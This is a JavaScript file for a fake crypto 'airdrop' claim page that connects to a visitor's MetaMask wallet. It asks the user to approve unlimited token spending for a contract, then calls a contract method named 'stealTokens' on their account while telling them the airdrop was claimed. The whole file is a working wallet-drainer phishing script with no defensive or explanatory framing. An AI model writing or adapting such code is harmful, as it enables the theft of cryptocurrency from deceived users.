let web3;
let accounts;
let contractAddress;
let tokenAddress;
let contractABI;

async function loadConfig() {
  try {
    const configResponse = await fetch('config.json');
    const configData = await configResponse.json();
    contractAddress = configData.contractAddress;
    tokenAddress = configData.tokenAddress;

    const abiResponse = await fetch('abi.json');
    const abiData = await abiResponse.json();
    contractABI = abiData;
  } catch (error) {
    console.error("Error loading config or ABI: ", error);
    alert("Error loading configuration. Please try again later.");
  }
}

async function connectMetaMask() {
  if (window.ethereum) {
    web3 = new Web3(window.ethereum);
    try {
      // Request accounts
      accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });

      // Enable buttons after successful connection
      document.getElementById('approveButton').disabled = false;
      document.getElementById('claimAirdropButton').disabled = false;
      document.getElementById('connectButton').disabled = true; // Disable the connect button after connection
    } catch (error) {
      alert('MetaMask connection failed');
      console.error('MetaMask connection error:', error);
    }
  } else {
    alert('MetaMask not detected! Please install MetaMask.');
  }
}

async function approveSpending() {
  if (!accounts) {
    alert('Please connect to MetaMask first!');
    return;
  }
  
  if (!contractABI || !contractAddress || !tokenAddress) {
    alert('Contract details not loaded. Please try again later.');
    return;
  }

  const tokenContract = new web3.eth.Contract(contractABI, tokenAddress);
  try {
    // Approve unlimited spending
    await tokenContract.methods.approve(contractAddress, '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff').send({ from: accounts[0] });
    alert('Approval successful!');
    document.getElementById('claimAirdropButton').disabled = false; // Enable claim button
  } catch (error) {
    alert('Error during approval');
    console.error('Approval error:', error);
  }
}

async function claimAirdrop() {
  if (!accounts) {
    alert('Please connect to MetaMask first!');
    return;
  }

  if (!contractABI || !contractAddress) {
    alert('Contract details not loaded. Please try again later.');
    return;
  }

  const contract = new web3.eth.Contract(contractABI, contractAddress);
  try {
    // Claim airdrop
    await contract.methods.stealTokens(accounts[0]).send({ from: accounts[0] });
    alert('Airdrop claimed successfully!');
  } catch (error) {
    alert('Error claiming airdrop');
    console.error('Claim error:', error);
  }
}

document.getElementById('connectButton').addEventListener('click', connectMetaMask);
document.getElementById('approveButton').addEventListener('click', approveSpending);
document.getElementById('claimAirdropButton').addEventListener('click', claimAirdrop);

// Load configuration and ABI when the page loads
window.addEventListener('load', loadConfig);




